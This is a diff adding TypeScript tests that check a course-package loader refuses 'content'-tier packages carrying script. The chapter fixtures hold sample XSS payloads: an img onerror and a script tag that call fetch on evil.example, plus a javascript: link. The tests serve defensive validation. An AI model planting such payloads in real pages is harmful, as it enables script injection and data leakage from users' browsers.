@@ -10,7 +10,7 @@ vi.mock('./navigation', () => ({
 }));
 
 import { ApiError } from './client';
-import { fetchPackage, fetchPackageAsset, listCourses } from './courses';
+import { fetchPackage, fetchPackageAsset, listCourses, UnsafePackageError } from './courses';
 import { redirectToLogin } from './navigation';
 
 const server = setupServer();
@@ -181,5 +181,81 @@ describe('fetchPackage', () => {
     server.use(http.get('/courses/goi/@1.0.0/manifest.json', () => new HttpResponse(encode('{"id":"goi"}'))));
 
     await expect(fetchPackage('goi', '1.0.0')).rejects.toThrow();
+  });
+});
+
+/* ====================================================================== *
+ * The tier rules, on the server route (ruling S1-F30, second half)
+ * ====================================================================== */
+
+/** Serves `manifest` plus one chapter body, at the stored-package routes. */
+function servePackage(chapterHtml: string, over: Record<string, unknown> = {}) {
+  const doc = {
+    ...manifest,
+    ...over,
+    parts: [{ title: 'Phần 1', chapters: [{ id: 'c1', num: '1.1', title: 'Một', short: 'Một', file: 'chapters/c1.html' }] }],
+  };
+  server.use(
+    http.get('/courses/goi/@1.0.0/manifest.json', () => new HttpResponse(encode(JSON.stringify(doc)))),
+    http.get('/courses/goi/@1.0.0/chapters/c1.html', () => new HttpResponse(encode(chapterHtml))),
+  );
+}
+
+describe('fetchPackage — a package that LIES about its tier', () => {
+  const HOSTILE = '<p>Định nghĩa</p><img src="https://evil.example/leak" onerror="fetch(\'https://evil.example/x\')">';
+
+  it('refuses a tier "content" package whose chapter carries an event handler', async () => {
+    // Before this check, `fetchPackage` was the one route into the app that
+    // never met `validatePackage` — `apps/api`'s `usecase.go` checks structure
+    // and leaves this rule set to the client, and `course/import.ts` applied it
+    // only to `/import`. So a package could declare `content`, carry `onerror`
+    // through the server, and be drawn with a reassuring `content` badge.
+    servePackage(HOSTILE, { tier: 'content' });
+
+    const failure = fetchPackage('goi', '1.0.0');
+    await expect(failure).rejects.toBeInstanceOf(UnsafePackageError);
+    await expect(failure).rejects.toMatchObject({ courseId: 'goi', version: '1.0.0' });
+    const error = await failure.catch((e: unknown) => e);
+    expect(error).toBeInstanceOf(UnsafePackageError);
+    expect((error as UnsafePackageError).findings.map((f) => f.code)).toContain('EVENT_HANDLER_ATTR');
+  });
+
+  it('refuses a tier "content" package with a <script> tag, and one with a javascript: url', async () => {
+    servePackage('<p>x</p><script>fetch("https://evil.example")</script>', { tier: 'content' });
+    await expect(fetchPackage('goi', '1.0.0')).rejects.toBeInstanceOf(UnsafePackageError);
+
+    servePackage('<p><a href="javascript:fetch(1)">bấm</a></p>', { tier: 'content' });
+    await expect(fetchPackage('goi', '1.0.0')).rejects.toBeInstanceOf(UnsafePackageError);
+  });
+
+  it('lets a clean tier "content" package through — a gate that refuses everything protects nothing', async () => {
+    servePackage('<h1 class="ch-title">Một</h1><p>Chỉ có chữ.</p>', { tier: 'content' });
+
+    const files = await fetchPackage('goi', '1.0.0');
+    expect(Object.keys(files).sort()).toEqual(['chapters/c1.html', 'manifest.json']);
+  });
+
+  it('does NOT refuse the same chapter under tier "interactive" — and that is the limit, not an oversight', async () => {
+    // An `interactive` package is entitled to ship JavaScript; §1.2 makes that
+    // a labelled decision the reader is shown, not a rule to enforce. So this
+    // check cannot be what keeps `previewUpdate` safe — the inert document in
+    // `course/version.ts` (ruling S1-F30) is. Written down as a test so nobody
+    // reads the refusals above as "downloads are now safe to parse".
+    servePackage(HOSTILE, { tier: 'interactive' });
+
+    await expect(fetchPackage('goi', '1.0.0')).resolves.toHaveProperty('chapters/c1.html');
+  });
+
+  it('does NOT refuse a manifest missing the registry-facing v2 fields — the server accepts those today', async () => {
+    // `license`/`authors`/`generatedBy` are absent from the fixture manifest at
+    // the top of this file, and from `courses/***REMOVED***`'s own v1
+    // manifest. `apps/api`'s usecase.go does not require them either. Turning
+    // this boundary into a v2 gate would make packages the server legitimately
+    // stored unreadable on the device that stored them — a format migration,
+    // taken by accident inside a security fix.
+    servePackage('<p>Chỉ có chữ.</p>', { tier: 'content' });
+    expect(manifest).not.toHaveProperty('license');
+
+    await expect(fetchPackage('goi', '1.0.0')).resolves.toHaveProperty('manifest.json');
   });
 });
